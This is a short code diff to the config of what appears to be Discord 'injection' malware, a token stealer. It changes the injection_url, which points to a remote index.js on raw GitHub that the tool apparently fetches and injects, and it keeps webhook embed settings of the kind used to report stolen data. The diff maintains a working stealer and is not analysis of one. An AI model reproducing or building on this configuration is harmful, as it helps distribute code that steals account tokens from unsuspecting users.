@@ -14,7 +14,7 @@ const config = {
   embed_name: 'lifeimitaion Injection', 
   embed_icon: 'https://github.com/cnvrs/l/main/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/cnvrs/l/main/index.js', 
   /**
    
    **/
